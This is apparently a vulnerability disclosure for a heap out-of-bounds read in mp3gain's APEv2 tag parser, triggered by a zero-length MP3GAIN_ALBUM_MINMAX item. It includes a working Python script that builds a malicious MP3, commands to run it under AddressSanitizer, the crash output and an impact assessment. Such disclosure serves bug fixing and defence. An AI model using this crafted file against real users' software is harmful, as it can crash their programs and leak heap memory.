## Bug0: Heap OOB Read in ReadMP3APETag via MP3GAIN_ALBUM_MINMAX with Zero-Length Value

In `ReadMP3APETag()` in `apetag.c` at lines 258 and 262, when an APE item named `MP3GAIN_ALBUM_MINMAX` has `item_value_size=0` the function allocates only 1 byte for the value buffer yet unconditionally calls `memcpy(tmpString, vp, 3)` without verifying that at least 3 bytes are available, causing a heap-buffer-overflow out-of-bounds read.

### PoC

Craft a malicious MP3 file using the Python script below and process it with the ASAN-instrumented mp3gain binary to trigger the vulnerability.

```python
#!/usr/bin/env python3
import struct

OUT_FILE = "poc_input.mp3"

# Minimal fake MPEG1 Layer3 128kbps 44100Hz stereo frame (417 bytes)
MP3_FRAME_HEADER = bytes([0xFF, 0xFB, 0x90, 0x00])
FRAME_SIZE = 417
mp3_frame = MP3_FRAME_HEADER + bytes(FRAME_SIZE - 4)

# Malicious APE item: name="MP3GAIN_ALBUM_MINMAX", item_value_size=0
# malloc(vsize+1) = malloc(1), but memcpy reads 3 bytes -> OOB
item_value_size = 0
item_flags = 0
item_key = b"MP3GAIN_ALBUM_MINMAX\x00"  # 21 bytes with null terminator
item_value = b""

item = struct.pack("<II", item_value_size, item_flags) + item_key + item_value
# item length: 4 + 4 + 21 + 0 = 29 bytes

# APEv2 footer (footer-only, no header)
items_total = len(item)  # 29
tag_size = items_total + 32  # 61
item_count = 1
footer_flags = 0x00000000

footer = (
    b"APETAGEX"
    + struct.pack("<I", 2000)         # version APEv2
    + struct.pack("<I", tag_size)     # tag_size = items + footer
    + struct.pack("<I", item_count)
    + struct.pack("<I", footer_flags)
    + b"\x00" * 8                    # reserved
)
assert len(footer) == 32

data = mp3_frame + item + footer

with open(OUT_FILE, "wb") as f:
    f.write(data)

print(f"Written {len(data)} bytes to {OUT_FILE}")
print(f"  MP3 frame:  {FRAME_SIZE} bytes")
print(f"  APE item:   {len(item)} bytes  (name=MP3GAIN_ALBUM_MINMAX, vsize=0)")
print(f"  APE footer: {len(footer)} bytes  (tag_size={tag_size})")
```

```bash
python3 gen.py
ASAN_OPTIONS="abort_on_error=0:log_path=./asan.log" ./build_test/mp3gain poc_input.mp3 || true
for f in ./asan.log.*; do grep -E "AddressSanitizer|ERROR:|runtime error:" "$f" || true; done
```

**Result:** ERROR: AddressSanitizer: heap-buffer-overflow on address 0x502000000031 at pc 0x7f0ac5dab397 bp 0x7ffc02310b20 sp 0x7ffc023102c8
SUMMARY: AddressSanitizer: heap-buffer-overflow ../../../../src/libsanitizer/sanitizer_common/sanitizer_common_interceptors.inc:827 in __interceptor_memcpy

### Impact

An attacker can supply a crafted MP3 file containing an APEv2 tag with an `MP3GAIN_ALBUM_MINMAX` item whose value size is zero, causing mp3gain to read up to 7 bytes beyond a 1-byte heap allocation and exposing adjacent heap memory contents. This out-of-bounds read is exposed by the default mp3gain invocation path on any untrusted file, requiring no special privileges or user interaction beyond opening the file. While the primary consequence is an information disclosure of heap contents and a likely crash, repeated triggering under memory-layout conditions could be leveraged to leak sensitive in-process data or to assist in defeating memory-safety mitigations.
